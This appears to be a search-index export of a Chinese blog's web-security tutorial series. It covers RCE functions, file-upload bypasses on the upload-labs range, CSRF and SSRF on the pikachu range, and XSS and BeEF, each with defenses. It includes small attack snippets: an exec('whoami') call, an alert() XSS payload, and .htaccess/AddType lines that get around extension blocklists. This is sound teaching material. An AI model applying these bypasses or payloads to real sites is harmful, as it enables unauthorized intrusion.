class="comment">// $data=$_GET[&#x27;name&#x27;]</span></span><br><span class="line"><span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>执行结果</strong></p><p><img src="/../img/img_artical/net_sec/14.4.9.png" alt="14.4.9"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-Web应用安全3</title>
      <link href="/posts/websec3.html"/>
      <url>/posts/websec3.html</url>
      
        <content type="html"><![CDATA[<h1 id="Web应用安全"><a href="#Web应用安全" class="headerlink" title="Web应用安全"></a>Web应用安全</h1><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="RCE概念"><a href="#RCE概念" class="headerlink" title="RCE概念"></a>RCE概念</h3><p><strong>远程命令&#x2F;代码执行</strong></p><ul><li>全称Remote Command&#x2F;CodeExecute，远程命令&#x2F;代码执行</li><li>通过构造特殊字符串，将数据提交至Web应用程序，并利用该方式执行外部程序或系统命令实施攻击</li></ul><p><strong>RCE的原理</strong></p><ul><li>Web应用程序使用了一些可以执行系统命令或代码的函数，而且对用户提交的数据过滤不严格，导致黑客利用服务器可以执行命令或代码</li></ul><h3 id="eval-函数"><a href="#eval-函数" class="headerlink" title="eval()函数"></a>eval()函数</h3><p><strong>语法</strong></p><ul><li>eval(string $code)：mixed</li></ul><p><strong>说明</strong></p><ul><li>将字符串作为PHP语句来执行</li><li>该字符串必须是合法的PHP代码，且以分号作为结束</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo (2+2)&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="assert-函数"><a href="#assert-函数" class="headerlink" title="assert()函数"></a>assert()函数</h3><p><strong>语法</strong></p><ul><li>assert(mixed $assertion, string $description &#x3D;?)：bool</li></ul><p><strong>说明</strong></p><ul><li>检查一个断言是否为 false</li><li>如果assertion 是字符串，它将会被assert()当做 PHP代码来执行</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num</span>=<span class="number">100</span>;</span><br><span class="line"><span class="variable">$ret</span>=<span class="title function_ invoke__">assert</span>(<span class="string">&quot;is_int(<span class="subst">$num</span>);&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$ret</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="preg-replace-函数"><a href="#preg-replace-函数" class="headerlink" title="preg_replace()函数"></a>preg_replace()函数</h3><ul><li>语法<ul><li>preg_replace(mixed $pattern , mixed $replacement , mixed $subject [, int $limit&#x3D;-1[,int &amp;$count]])：mixed</li></ul></li><li>说明<ul><li>搜索subject中匹配pattern的部分，以replacement进行替换</li><li>5.5.版本后，传入”e”修饰符时，会产生一个E_DEPRECATED错误</li><li>7.0.0不再支持&#x2F;e修饰符，请用 preg_replace_callback()代替</li></ul></li><li>案例</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/test/e&quot;</span>,<span class="title function_ invoke__">phpinfo</span>(),<span class="string">&quot;just test&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><p><strong>语法</strong></p><ul><li>exec(string $command, array &amp;$output &#x3D; ?, int &amp;$return_var&#x3D; ?)：string</li></ul><p><strong>说明</strong></p><ul><li>执行command 参数所指定的命令</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>类似函数</strong></p><ul><li>string exec(string $command [, array &amp;$output [, int &amp;$return_var ]])</li><li>string shell_exec(string $cmd)</li><li>string escapeshellcmd(string $command)</li><li>void passthru(string $command [, int &amp;$return_var ])</li><li>反引号</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#使用反撇号，按时作为命令来执行</span></span><br><span class="line"><span class="variable">$result</span>=<span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="命令连接符"><a href="#命令连接符" class="headerlink" title="命令连接符"></a>命令连接符</h3><p><strong>命令连接符</strong></p><table><thead><tr><th>符号</th><th>说明</th></tr></thead><tbody><tr><td>cmd1  &amp;&amp;  cmd2</td><td>执行cmd1，执行成功后执行cmd2，否则不执行cmd2</td></tr><tr><td>cmd1  &amp;  cmd2</td><td>表示先执行cmd1，不管是否成功都执行cmd2</td></tr><tr><td>cmd1  ||  cmd2</td><td>表示先执行cmd1，执行失败后执行cmd2</td></tr><tr><td>cmd1  |  cmd2</td><td>将cmd1的输出作为cmd2的输入，只打印cmd2执行的结果</td></tr></tbody></table><h3 id="RCE防御"><a href="#RCE防御" class="headerlink" title="RCE防御"></a>RCE防御</h3><ul><li>尽量避免使用危险函数</li><li>对用户输入严格检查和过滤</li></ul><h2 id="PHP文件上传漏洞"><a href="#PHP文件上传漏洞" class="headerlink" title="PHP文件上传漏洞"></a>PHP文件上传漏洞</h2><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><ul><li>文件上传是Web应用的常见功能，允许用户上传图片、视频及其他文件类型文件</li><li>向用户提供的功能越多，Web应用受攻击的风险就越大</li></ul><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><ul><li><p>上传文件时，如果未对上传的文件进行严格的验证和过滤，攻击者就可以上传恶意的脚本文件，例如: php、jsp、asp以及aspx等</p></li><li><p>恶意上传行为可能导致网站甚至整个服务器被控制恶意的脚本文件，又被称为WebShell</p></li></ul><p><strong>upload-labs，文件上传漏洞靶场</strong></p><ul><li>php语言编写的，专门收集渗透测试过程中遇到的各种上传漏洞的靶场</li><li>下载地址: <a href="https://github.com/Tj1ngwe1/upload-labs">https://github.com/Tj1ngwe1/upload-labs</a></li></ul><p><img src="/../img/img_artical/net_sec/14.3.1.png" alt="14.3.1"></p><h3 id="Pass-01前端限制与绕过"><a href="#Pass-01前端限制与绕过" class="headerlink" title="Pass-01前端限制与绕过"></a>Pass-01前端限制与绕过</h3><p><strong>本pass在客户端使用js对不合法图片进行检查！</strong></p><p><img src="/../img/img_artical/net_sec/14.3.2.png" alt="14.3.2"></p><p><img src="/../img/img_artical/net_sec/14.3.3.png" alt="14.3.3"></p><p><strong>绕过方法</strong></p><ul><li>在浏览器的调试窗口修改表单的onsubmit事件</li></ul><p><img src="/../img/img_artical/net_sec/14.3.4.png" alt="14.3.4"></p><h3 id="Pass-02-MIME限制与绕过"><a href="#Pass-02-MIME限制与绕过" class="headerlink" title="Pass-02 MIME限制与绕过"></a>Pass-02 MIME限制与绕过</h3><p><strong>本pass在服务端对数据包的MIME进行检查！</strong></p><p><img src="/../img/img_artical/net_sec/14.3.5.png" alt="14.3.5"></p><p><strong>MIME（Multipurpose  Internet Mail Extensions）</strong></p><ul><li>多用途互联网邮件扩展类型</li><li>是一个互联网标准，扩展了电子邮件标准，可以支持更多的文件格式</li></ul><p><strong>常见的MIME类型</strong></p><table><thead><tr><th>扩展名</th><th>类型&#x2F;子类型</th></tr></thead><tbody><tr><td>doc</td><td>application&#x2F;msword</td></tr><tr><td>gif</td><td>image&#x2F;gif</td></tr><tr><td>html</td><td>text&#x2F;html</td></tr><tr><td>jpeg</td><td>image&#x2F;jpeg</td></tr><tr><td>jpg</td><td>image&#x2F;jpeg</td></tr><tr><td>pdf</td><td>application&#x2F;pdf</td></tr></tbody></table><p><strong>本pass在服务端对数据包的MIME进行检查！</strong></p><ul><li>$_FILES[[‘upload_file’][‘type’]是从请求包的Content-Type中读取</li></ul><p><img src="/../img/img_artical/net_sec/14.3.6.png" alt="14.3.6"></p><p><strong>绕过方法</strong></p><ul><li>通过代理burpsuite抓包修改文件的MIME类型将红色字体部分，换成image&#x2F;jpeg</li><li>点击forward，将修改后的请求发送给服务器</li></ul><p><img src="/../img/img_artical/net_sec/14.3.7.png" alt="14.3.7"></p><h3 id="Pass-03黑名单限制与绕过"><a href="#Pass-03黑名单限制与绕过" class="headerlink" title="Pass-03黑名单限制与绕过"></a>Pass-03黑名单限制与绕过</h3><p><strong>本pass禁止上传.asp|.aspx|.php|.jsp后缀文件！</strong></p><p><img src="/../img/img_artical/net_sec/14.3.8.png" alt="14.3.8"></p><p><img src="/../img/img_artical/net_sec/14.3.9.png" alt="14.3.9"></p><p><strong>绕过方法</strong></p><ul><li>将文件后缀由php修改为phtml、phps、php3均可</li><li>另外需要修改Apache的配置文件，增加下列项</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .php3 .phps</span><br></pre></td></tr></table></figure><h3 id="6、Pass-04黑名单限制与绕过"><a href="#6、Pass-04黑名单限制与绕过" class="headerlink" title="6、Pass-04黑名单限制与绕过"></a>6、Pass-04黑名单限制与绕过</h3><p><strong>本pass禁止上传.php|.php5|.php4|.php3|.php2|.php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|.pHp1|.Html|.Htm|.pHtml|.jsp|.jspa |.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx |.jSpa |.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa .|asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.swfl|.swf 后缀文件！</strong></p><p><img src="/../img/img_artical/net_sec/14.3.10.png" alt="14.3.10"></p><p><strong>绕过方法</strong></p><ul><li>没有过滤htaccess后缀，我们可以构建一个htaccess配置文件，让所有格式文件都解析为php。</li><li>.htaccess语句</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-Web应用安全2</title>
      <link href="/posts/websec2.html"/>
      <url>/posts/websec2.html</url>
      
        <content type="html"><![CDATA[<h1 id="Web应用安全"><a href="#Web应用安全" class="headerlink" title="Web应用安全"></a>Web应用安全</h1><h2 id="CSRF跨站请求伪造"><a href="#CSRF跨站请求伪造" class="headerlink" title="CSRF跨站请求伪造"></a>CSRF跨站请求伪造</h2><h3 id="CSR概念"><a href="#CSR概念" class="headerlink" title="CSR概念"></a>CSR概念</h3><p><strong>什么是CSRF跨站？</strong></p><ul><li>全称是Cross-Site Request Forgery，中文跨站请求伪造</li></ul><p><strong>CSRF原理</strong></p><ul><li>黑客利用已经登录的用户，诱导其访问或登录某个早已构造好的恶意链接或者页面，然后在用户毫不知情的情况下，以用户名义完成了非用户本意的非法操作</li></ul><h3 id="CSRF攻击流程"><a href="#CSRF攻击流程" class="headerlink" title="CSRF攻击流程"></a>CSRF攻击流程</h3><p><img src="/../img/img_artical/net_sec/14.2.1.png" alt="14.2.1"></p><h3 id="CSRF实例"><a href="#CSRF实例" class="headerlink" title="CSRF实例"></a>CSRF实例</h3><p><strong>打开pikachu靶场，选中右侧导航栏中的CSRF</strong></p><p><img src="/../img/img_artical/net_sec/14.2.2.png" alt="14.2.2"></p><p><strong>通过页面右上角的提示，可以获取用户名称和密码</strong></p><p><img src="/../img/img_artical/net_sec/14.2.3.png" alt="14.2.3"></p><p><strong>登录后，修改用户信息，点击提交，获取提交的url</strong></p><p><img src="/../img/img_artical/net_sec/14.2.4.png" alt="14.2.4"></p><p><strong>攻击者获取修改信息的URL后，就可以构造出CSRF攻击的URL</strong></p><p><img src="/../img/img_artical/net_sec/14.2.5.png" alt="14.2.5"></p><p><strong>攻击者获取修改信息的URL后，就可以构造出CSRF攻击的URL例如：将kobe的性别修改为girl</strong></p><p><img src="/../img/img_artical/net_sec/14.2.6.png" alt="14.2.6"></p><p><strong>将以下url放到某个其它网站上，引诱被攻击者点击</strong></p><ul><li>如果被攻击者此时登录状态或cookie&#x2F;session没有过期，则信息被修改</li><li>注意：实际的IP地址是对应的被攻击的网站的IP</li></ul><p><img src="/../img/img_artical/net_sec/14.2.7.png" alt="14.2.7"></p><h3 id="CSRF防御实例"><a href="#CSRF防御实例" class="headerlink" title="CSRF防御实例"></a>CSRF防御实例</h3><p><strong>增加token的验证的页面</strong></p><p><img src="/../img/img_artical/net_sec/14.2.8.png" alt="14.2.8"></p><p><strong>增加token的验证，页面部分代码</strong></p><p><img src="/../img/img_artical/net_sec/14.2.9.png" alt="14.2.9"></p><p><strong>修改信息后，点击submit按钮后抓包，连同token一起提交修改成功</strong></p><p><strong>注意，token是随机的</strong></p><p><img src="/../img/img_artical/net_sec/14.2.10.png" alt="14.2.10"></p><p><strong>构造的url没有包含token或错误的token都将请求失败</strong></p><p><img src="/../img/img_artical/net_sec/14.2.11.png" alt="14.2.11"></p><h3 id="CSRF与XSS的区别"><a href="#CSRF与XSS的区别" class="headerlink" title="CSRF与XSS的区别"></a>CSRF与XSS的区别</h3><ul><li>CSRF攻击者并没有拿到用户的权限，是借用户的权限完成攻击</li><li>XSS可以通过盗取cookie来获取用户权限来完成攻击</li></ul><h2 id="SSRF服务器端请求伪造"><a href="#SSRF服务器端请求伪造" class="headerlink" title="SSRF服务器端请求伪造"></a>SSRF服务器端请求伪造</h2><h3 id="SSRF概念"><a href="#SSRF概念" class="headerlink" title="SSRF概念"></a>SSRF概念</h3><p><strong>什么是SSRF</strong></p><ul><li>全称Server-Side Request Forgery，中文是服务器端请求伪造</li><li>由攻击者构造形成，但是由服务器端发起请求</li><li>攻击目标是从外网无法访问的内部系统</li></ul><p><strong>SSRF成因</strong></p><ul><li>服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据</li></ul><h3 id="SSRF攻击流程"><a href="#SSRF攻击流程" class="headerlink" title="SSRF攻击流程"></a>SSRF攻击流程</h3><p><img src="/../img/img_artical/net_sec/14.2.12.png" alt="14.2.12"></p><h3 id="SSRF场景"><a href="#SSRF场景" class="headerlink" title="SSRF场景"></a>SSRF场景</h3><p><strong>Web项目中出现SSRF漏洞的常见功能点</strong></p><ul><li>分享：通过URL地址栏分享网页内容</li><li>转码服务：通过URL地址把原地址的网页内容调优以适合手机屏幕</li><li>图片加载、下载：通过URL地址加载或下载图片</li><li>收藏：图片及文章的收藏功能</li><li>API：未公开的api实现以及其它调用URL的功能</li></ul><h3 id="SSRF相关的PHP函数"><a href="#SSRF相关的PHP函数" class="headerlink" title="SSRF相关的PHP函数"></a>SSRF相关的PHP函数</h3><p><strong>curl_exec()</strong></p><ul><li>执行CURL会话</li></ul><p><strong>file_get_contents()</strong></p><ul><li>将整个文件读入一个字符串</li></ul><p><strong>fsockopen()</strong></p><ul><li>打开一个网络连接或者一个Unix套接字连接</li></ul><h3 id="SSRF危害"><a href="#SSRF危害" class="headerlink" title="SSRF危害"></a>SSRF危害</h3><ul><li>扫内网</li><li>向内部任意主机的任意端口发送精心构造的Payload</li><li>攻击内网的web应用</li><li>利用file协议读取本地文件等</li></ul><h3 id="SSRF漏洞利用"><a href="#SSRF漏洞利用" class="headerlink" title="SSRF漏洞利用"></a>SSRF漏洞利用</h3><p><strong>打开pikachu靶场，选择SSRF标签</strong></p><p><img src="/../img/img_artical/net_sec/14.2.13.png" alt="14.2.13"></p><p><strong>SSRF（curl）的核心代码</strong></p><p><img src="/../img/img_artical/net_sec/14.2.14.png" alt="14.2.14"></p><p><strong>正常操作，点击页面内容</strong></p><p><img src="/../img/img_artical/net_sec/14.2.15.png" alt="14.2.15"></p><p><strong>将url的值换成自己的payload，实现漏洞利用</strong></p><ul><li>假设我们部署的dvwa只允许内网访问</li></ul><p><img src="/../img/img_artical/net_sec/14.2.16.png" alt="14.2.16"></p><p><strong>SSRF（file_get_content）</strong></p><ul><li>点击页面，内容显示如下，关注url</li></ul><p><img src="/../img/img_artical/net_sec/14.2.17.png" alt="14.2.17"></p><p><strong>SSRF（file_get_content）核心代码</strong></p><p><img src="/../img/img_artical/net_sec/14.2.18.png" alt="14.2.18"></p><p><strong>将url的值换成自己的payload，实现漏洞利用</strong></p><ul><li>读取指定的文件内容</li></ul><p><img src="/../img/img_artical/net_sec/14.2.19.png" alt="14.2.19"></p><h3 id="SSRF漏洞防御"><a href="#SSRF漏洞防御" class="headerlink" title="SSRF漏洞防御"></a>SSRF漏洞防御</h3><ul><li>禁用不需要的协议，例如：仅仅允许http和https请求</li><li>设置白名单方式</li><li>限制请求的端口</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-Web应用安全1</title>
      <link href="/posts/websec1.html"/>
      <url>/posts/websec1.html</url>
      
        <content type="html"><![CDATA[<h1 id="Web应用安全"><a href="#Web应用安全" class="headerlink" title="Web应用安全"></a>Web应用安全</h1><h2 id="Web安全概述"><a href="#Web安全概述" class="headerlink" title="Web安全概述"></a>Web安全概述</h2><h3 id="Web安全现状"><a href="#Web安全现状" class="headerlink" title="Web安全现状"></a>Web安全现状</h3><p><strong>Web安全统计数据</strong></p><ul><li>据全球知名IT调研与咨询服务公司Gartner的最新调查，信息安全攻击有75%都是发生在Web应用而非网络层面上。同时，数据也显示，三分之二的Web站点都相当脆弱易受攻击。</li></ul><h3 id="Web安全事件"><a href="#Web安全事件" class="headerlink" title="Web安全事件"></a>Web安全事件</h3><p><strong>CSDN网站六百万用户信息外泄</strong></p><ul><li>2011年12月21日，黑客在网上公开了CSDN的用户数据库，高达600多万个明文的注册邮箱账号和密码遭到曝光和外泄，成为中国互联网历史上一次具有深远意义的网络安全事故。</li></ul><p><strong>12306信息泄露</strong></p><ul><li>中国铁路公安机关证实，2014年12月25日犯罪嫌疑人蒋某某、施某某通过”撞库”方式非法获取12306用户数据。如今犯罪嫌疑人落网，但超过13万条12306用户账号密码已经在网上公开传播。</li></ul><p><strong>东方航空支付漏洞</strong></p><ul><li>中国东方航空股份有限公司支付系统验证漏洞可以1元认购10000积分(价值2500RMB)</li></ul><h3 id="Web体系结构图"><a href="#Web体系结构图" class="headerlink" title="Web体系结构图"></a>Web体系结构图</h3><p><img src="/../img/img_artical/net_sec/14.1.1.png" alt="14.1.1"></p><h3 id="Web体系漏洞图"><a href="#Web体系漏洞图" class="headerlink" title="Web体系漏洞图"></a>Web体系漏洞图</h3><p><img src="/../img/img_artical/net_sec/14.1.2.png" alt="14.1.2"></p><h3 id="OWASP-TOP10"><a href="#OWASP-TOP10" class="headerlink" title="OWASP TOP10"></a>OWASP TOP10</h3><p><strong>什么是OWSAP?</strong></p><ul><li>全称Open WebApplication Security Project，开放Web软件安全项目</li><li>一个开源的、非盈利的全球性安全组织</li><li>研究Web软件安全标准、工具与技术</li><li>目前OWASP全球拥有250个分部近7万名会员</li><li><a href="http://www.owasp.org.cn/">http://www.owasp.org.cn</a></li></ul><p><strong>OWSAP TOP10</strong></p><p><img src="/../img/img_artical/net_sec/14.1.3.png" alt="14.1.3"></p><h2 id="XSS跨站脚本"><a href="#XSS跨站脚本" class="headerlink" title="XSS跨站脚本"></a>XSS跨站脚本</h2><h3 id="XSS介绍"><a href="#XSS介绍" class="headerlink" title="XSS介绍"></a>XSS介绍</h3><p><strong>什么是XSS</strong></p><ul><li>全称Cross-Site Scripting，中文跨站脚本</li><li>攻击者利用网站漏洞把恶意脚本代码(JS脚本)注入到网页中</li><li>当其他用户浏览这些网页时，就会执行其中的恶意代码</li><li>产生的威胁包括窃取cookie中的用户资料、会话劫持、钓鱼欺骗等</li><li>属于前端漏洞</li></ul><h3 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h3><p><strong>XSS根据特性和利用手法的不同，主要分成三大类型</strong></p><ul><li>反射型XSS</li><li>持久型XSS</li><li>DOM型XSS</li></ul><h3 id="反射型XSS攻击原理"><a href="#反射型XSS攻击原理" class="headerlink" title="反射型XSS攻击原理"></a>反射型XSS攻击原理</h3><p><strong>服务器相当于一面镜子</strong></p><p><img src="/../img/img_artical/net_sec/14.1.4.png" alt="14.1.4"></p><h3 id="反射型XSS实例"><a href="#反射型XSS实例" class="headerlink" title="反射型XSS实例"></a>反射型XSS实例</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tittle</span>&gt;</span>xss测试结果<span class="tag">&lt;/<span class="name">tittle</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">echo $_REQUEST[&#x27;name&#x27;];</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>GET提交运行的效果</strong></p><p><img src="/../img/img_artical/net_sec/14.1.5.png" alt="14.1.5"></p><h3 id="持久型XSS概念"><a href="#持久型XSS概念" class="headerlink" title="持久型XSS概念"></a>持久型XSS概念</h3><ul><li>持久型跨站脚本也称存储型跨站脚本</li><li>此类XSS不需要诱导被攻击点击特殊链接</li><li>攻击者事先将恶意JS代码上传或存储到漏洞服务器中</li><li>当受害者浏览了包含恶意JS代码的页面时就会执行恶意代码</li></ul><h3 id="持久型XSS攻击原理"><a href="#持久型XSS攻击原理" class="headerlink" title="持久型XSS攻击原理"></a>持久型XSS攻击原理</h3><p><img src="/../img/img_artical/net_sec/14.1.6.png" alt="14.1.6"></p><h3 id="持久型XSS实例"><a href="#持久型XSS实例" class="headerlink" title="持久型XSS实例"></a>持久型XSS实例</h3><p><strong>基于pikachu靶场分析持久型XSS</strong></p><ul><li>进入pikachu靶场，点击持久型XSS标签，在主页面部分输入正常文本</li><li>可以看到有删除链接，说明用户数据存储到服务器上了</li></ul><p><img src="/../img/img_artical/net_sec/14.1.7.png" alt="14.1.7"></p><p><strong>基于pikachu靶场分析持久型XSS</strong></p><ul><li>进入pikachu靶场，点击持久型XSS标签</li><li>在主页面输入payload:&lt;script&gt;alert(111)&lt;&#x2F;script&gt;，点击提交</li></ul><p><img src="/../img/img_artical/net_sec/14.1.8.png" alt="14.1.8"></p><h3 id="DOM型XSS概念"><a href="#DOM型XSS概念" class="headerlink" title="DOM型XSS概念"></a>DOM型XSS概念</h3><p><strong>什么是DOM？</strong></p><ul><li>DOM全称Document Object Model，中文是文档对象模型</li><li>DOM会将HTML文件的节点构成树状结构，以此反映html文件本身的层级结构</li></ul><p><img src="/../img/img_artical/net_sec/14.1.9.png" alt="14.1.9"></p><h3 id="DOM型XSS原理"><a href="#DOM型XSS原理" class="headerlink" title="DOM型XSS原理"></a>DOM型XSS原理</h3><ul><li>客户端的脚本程序可以通过DOM动态的检查和修改页面内容</li><li>程序执行不依赖于服务器端的数据</li></ul><h3 id="BeEF介绍"><a href="#BeEF介绍" class="headerlink" title="BeEF介绍"></a>BeEF介绍</h3><ul><li>BeEF，全称The Browser Exploitation Framework，是一款针对浏览器的渗透测试工具</li><li>使用Ruby语言开发</li><li>用于实现对XSS漏洞的攻击和利用</li><li>官网：<a href="https://beefproject.com/">https://beefproject.com</a></li></ul><h3 id="BeEF原理"><a href="#BeEF原理" class="headerlink" title="BeEF原理"></a>BeEF原理</h3><ul><li>BeEF向网页中插入一段名为hook.is的JS脚本代码，如果浏览器访问了有hook.is(钩子)的页面，就会被hook(勾住)，浏览器会执行初始代码返回一些信息</li><li>受害的浏览器，每隔一段时间(默认为1秒)就会向BeEF服务器发送请求询问是否有新的代码需要执行</li></ul><h3 id="BeEF功能介绍"><a href="#BeEF功能介绍" class="headerlink" title="BeEF功能介绍"></a>BeEF功能介绍</h3><ul><li>Online Browsers：在线的主机，现在该主机浏览器执行了JS脚本代码</li><li>Offline Browsers：不在线的主机，该主机曾经执行过JS脚本代码</li><li>Details：浏览器信息详情</li><li>Logs：能记录你在浏览器上的操作</li><li>Commands：你能对该浏览器进行哪些操作</li></ul><p><img src="/../img/img_artical/net_sec/14.1.10.png" alt="14.1.10"></p><ul><li>绿色：命令模块可以在目标浏览器上运行，且用户不会感到任何异常</li><li>橙色：命令模块可以在目标浏览器上运行，但是用户可能会感到异常(例如弹窗、提示、跳转等)</li><li>灰色：命令模块尚未针对止一口此目标进行验证，不知道是否可运行</li><li>红色：命令模块不适用于此目标</li></ul><p><img src="/../img/img_artical/net_sec/14.1.11.png" alt="14.1.11"></p><h3 id="XSS攻击的防御"><a href="#XSS攻击的防御" class="headerlink" title="XSS攻击的防御"></a>XSS攻击的防御</h3><p><strong>业内防御跨站脚本攻击的方式一般有两种</strong></p><ul><li>Input Filtering，在输入端过滤</li><li>Output Filtering，在输出端过滤</li></ul><p><strong>输入验证</strong></p><ul><li>“永远不要相信用户的输入”是网站开发的基本常识</li><li>对输入数据的过滤，具体可以从两方面着手：输入验证和数据消毒</li><li>输入验证要根据实际情况来设计，下面是一些常见的检测和过滤<ul><li>输入是否仅仅包含合法字符</li><li>输入字符串是否超过了最大长度限制</li><li>输入为数字，数字是否在指定的范围</li><li>输入是否符合特殊的格式要求，如Email、IP地址等</li></ul></li></ul><p><strong>数据消毒</strong></p><ul><li>除了在客户端验证数据的合法性，输入过滤中最重要的还是净化有害的输入，例如常见敏感字符：”&lt;&gt;、’’、””、#”</li></ul><p><strong>输出过滤</strong></p><ul><li>输出到网页前，进行输出编码</li><li>PHP的Htmlspecialchars()函数可以将以下特殊字符转换成字符实体编码</li></ul><table><thead><tr><th>特殊字符</th><th>字符实体编码</th></tr></thead><tbody><tr><td>&lt;</td><td>&amp;lt;</td></tr><tr><td>&gt;</td><td>&amp;gt;</td></tr><tr><td>&amp;</td><td>&amp;amp;</td></tr><tr><td>,</td><td>&amp;quot;</td></tr><tr><td>“</td><td>&amp;#39;</td></tr></tbody></table><p><strong>输入与输出过滤的对比</strong></p><ul><li>在数据存入数据库之前过滤和转义，顺便可以把SOL注入等其他漏洞一并检查，缺点是无法处理之前已经存在于数据库中的恶意代码</li><li>在数据输出到浏览器之前进行转义，很安全，缺点是必须对每一个细节的输出过滤，因此，会带来额外的工作量</li></ul><p><strong>另外，可以设置cookie的模式为http only禁止</strong></p><ul><li>使用JavaScript代码读取cookie</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-SQL注入3</title>
      <link href="/posts/injection3.html"/>
      <url>/posts/injection3.html</url>
      
